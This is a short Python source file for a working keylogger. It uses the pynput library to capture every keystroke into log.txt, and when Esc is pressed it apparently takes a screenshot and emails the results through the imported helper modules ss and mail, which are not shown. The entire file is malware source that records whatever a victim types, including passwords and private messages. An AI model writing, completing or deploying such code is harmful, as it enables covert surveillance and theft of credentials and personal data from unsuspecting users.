import pynput 
from pynput.keyboard import Key, Listener
import ss
import mail

keys = []

def onKeyPress(key):
    try:
        pass 
        
    except Exception as ex:
        print('There was an error : ',ex)

def onKeyRelease(key):
    global keys, charCount  #Access global variables
    if key == Key.esc:
        ss.take_ss()
        mail.send_mail()
        return False
    else:
        keys.append(key)    #Store the Keys
        writeToFile(keys)
        keys=[]

def writeToFile(keys):
    with open('log.txt','a') as file:
        for key in keys:
            
            if hasattr(key, 'char'):  # Write the character pressed if available
                file.write(key.char)
            else:
                if key==Key.space:
                    file.write(' ')
                if key==Key.enter:
                    file.write('\n')
                if key==Key.backspace:
                    a=file.tell()-1
                    file.truncate(a)
    

with Listener(on_press=onKeyPress,\
    on_release=onKeyRelease) as listener:
    listener.join()
